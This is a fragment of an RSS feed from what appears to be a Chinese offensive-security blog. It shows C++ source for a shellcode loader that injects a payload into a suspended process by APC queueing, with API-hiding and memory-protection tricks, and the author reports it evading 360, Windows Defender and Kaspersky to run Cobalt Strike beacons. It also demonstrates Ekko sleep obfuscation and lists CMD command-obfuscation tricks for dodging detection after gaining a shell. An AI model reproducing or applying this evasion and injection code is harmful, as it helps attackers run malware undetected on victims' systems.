class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID lpAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T dwSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD  flAllocationType,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD  flProtect&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;BOOL&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pVirtualProtect)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID lpAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T dwSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	DWORD  flNewProtect,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	PDWORD lpflOldProtect&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;BOOL&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pWriteProcessMemory)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	HANDLE  hProcess,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPVOID  lpBaseAddress,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	LPCVOID lpBuffer,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T  nSize,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	SIZE_T* lpNumberOfBytesWritten&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DWORD&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(WINAPI* pQueueUserAPC)&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	PAPCFUNC  pfnAPC,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	HANDLE    hThread,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	ULONG_PTR dwData&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;	)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;GoHere&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	STARTUPINFO si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	PROCESS_INFORMATION pi = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	HMODULE hKernel32 = &lt;span class=&#34;built_in&#34;&gt;GetModuleHandleW&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pCreateProcessA MyCreateProcess = (pCreateProcessA)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, CreateP);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pVirtualAllocEx MyVirtualAlloc = (pVirtualAllocEx)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, VirAloc);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pVirtualProtect MyVirProtect = (pVirtualProtect)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, VirPro);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pWriteProcessMemory MyWriteMen = (pWriteProcessMemory)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, WriteMem);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pQueueUserAPC MyQueueAPC = (pQueueUserAPC)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(hKernel32, QueAPC);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyCreateProcess&lt;/span&gt;(text_path, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTARTUPINFOA)&amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;MyVirtualAlloc&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X400200&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	DWORD oldProtect;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_NOACCESS, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;986&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_READWRITE, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;777&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_NOACCESS, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;321&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_READWRITE, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_NOACCESS, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;; i++);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyVirProtect&lt;/span&gt;(lpBaseeAddresss, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; fish, PAGE_EXECUTE_READ, &amp;amp;oldProtect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;Sleep&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;15000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyWriteMen&lt;/span&gt;(pi.hProcess, lpBaseeAddresss, (LPVOID)fish, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(fish), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;MyQueueAPC&lt;/span&gt;((PAPCFUNC)lpBaseeAddresss, pi.hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//工具生成的junkCode进行填充，太长了就不写了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 编译完后还可以进一步操作，比如替换 ico 图标，添加伪签名等等。这里我只进行图标的替换测试了 360 (核晶模式)、windowDefinder (个人版、企业版、专业版)、卡巴斯基 (免费版)，其中除了 wdf 专业版无法上线之外其他都能做到无感上线，并且可以直接执行 shell 命令 (当然这里我用的是 cs4.9 并且配置了 C2profile 有一定的流量规避效果)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;360 核晶&lt;/strong&gt;：&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnl0tgyj31c00u0gs7.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;wdf (真实环境远程上线 ==&amp;gt; 执行 screenshot)&lt;/strong&gt;：&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqr5hiihj316c0pi7an.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;卡巴斯基&lt;/strong&gt;：&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnosm7hj31u70u0dqa.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;360 杀毒 + 360 核晶会报警告提示&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;ekko睡眠混淆技术演示&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ekko睡眠混淆技术演示&#34;&gt;#&lt;/a&gt; Ekko 睡眠混淆技术演示：&lt;/h5&gt;
&lt;p&gt;该项目也是 havoC2 的作者的，已经集成在了 havoc 上，在这我们单独把这个项目运行看看，将 github 上的项目拉取到本地即可，编译器用的是 visual studio2022。其混淆原理简单来说就是在一个周期内睡眠结束后的几十毫秒内将内存中代码段进行异或恢复到正常功能代码，并同时恢复 RX 属性。&lt;br /&gt;
我们需要关注的代码段就在 Ekko.c 中，这里我们单独提炼出来：&lt;br /&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ImageBase = &lt;span class=&#34;built_in&#34;&gt;GetModuleHandleA&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);     &lt;span class=&#34;comment&#34;&gt;//获取当前进程基址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//获取该本进程内存镜像大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DWORD e_lfanew = dosHeader-&amp;gt;e_lfanew;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;*)ImageBase + e_lfanew);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ImageSize = ntHeaders-&amp;gt;OptionalHeader.SizeOfImage;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//ImageSize = 0x0005e6b4;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 这里获取内存镜像大小的代码我做了修改，原项目的代码在我本地运行时获取到的大小始终为 0，暂时也不清楚什么情况。&lt;br /&gt;
这里我们修改完后再编译即可，这里我们使用 messagebox 来模拟 c2 服务端发送的指令，使用&lt;strong&gt; ProcessHacker&lt;/strong&gt; 监控内存变换。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;非睡眠时间段 (事件等待时间段)：&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpvp4d5wtj31cz0u0x05.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;em&gt;&lt;strong&gt;睡眠混淆时间段：&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hrpvp7ovgyj31cu0u0aux.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/</guid>
            <title>CMD命令混淆</title>
            <link>https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/</link>
            <category term="攻防技巧" scheme="https://shut-td.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" />
            <category term="攻防技巧" scheme="https://shut-td.github.io/tags/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" />
            <pubDate>Wed, 03 Apr 2024 00:53:28 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;背景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#背景&#34;&gt;#&lt;/a&gt; 背景&lt;/h3&gt;
&lt;p&gt;当我们获取 shell 或者连接到远控时，直接执行高危操作会被拦截因此需要做命令上的混淆来达到静态免杀的效果。&lt;/p&gt;
&lt;h5 id=&#34;1-转义符号连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-转义符号连接&#34;&gt;#&lt;/a&gt; 1、转义符号连接&lt;/h5&gt;
&lt;p&gt;即在命令中通过填充  ^  该符号进行混淆&lt;br /&gt;
 &lt;figure class=&#34;highlight cos&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^h&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^o&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^am&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^i&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczg4gntcj30dk02pglk.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt; 注意这里一次只能用一个 ^ 进行连接&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&#34;2-利用set设置变量并使用连续执行达到混淆效果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-利用set设置变量并使用连续执行达到混淆效果&#34;&gt;#&lt;/a&gt; 2、利用 set 设置变量并使用 &amp;amp;&amp;amp; 连续执行达到混淆效果&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cos&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;set&lt;/span&gt; gg=wh&amp;amp;&amp;amp;&lt;span class=&#34;built_in&#34;&gt;%gg&lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;%oami&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;再加上&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;的操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;set&lt;/span&gt; gg=&lt;span class=&#34;keyword&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^h&lt;/span&gt;^&amp;amp;&amp;amp;&lt;span class=&#34;built_in&#34;&gt;%gg&lt;/span&gt;&lt;span class=&#34;built_in&#34;&gt;%oa&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^mi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznijn5cj30ei023weh.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznwfke0j30fq02jdfu.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;3-双引号包裹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-双引号包裹&#34;&gt;#&lt;/a&gt; 3、双引号包裹&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;wh&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;o&lt;span class=&#34;string&#34;&gt;&amp;quot;ami&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&amp;quot;w&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;h^o&amp;quot;&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;am^i&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoczp72g9fj30c202swef.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczplami2j30dw02et8o.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;4-括号包裹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-括号包裹&#34;&gt;#&lt;/a&gt; 4、括号包裹&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cos&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;((((((whoami))))))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;混合有限只能中间和 ^ 配合&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;((((((&lt;span class=&#34;keyword&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^h&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^o&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^a&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^m&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;^i&lt;/span&gt;))))))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczqr3468j30ea02et8p.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczr5q7d6j30fg02kt8q.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;5-unicode替换非通用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-unicode替换非通用&#34;&gt;#&lt;/a&gt; 5、Unicode 替换 (非通用)&lt;/h5&gt;
&lt;p&gt;ʱ ʰ ʲ ʳ ʷ ʸ ˢ ˣ ˡ&lt;br /&gt;
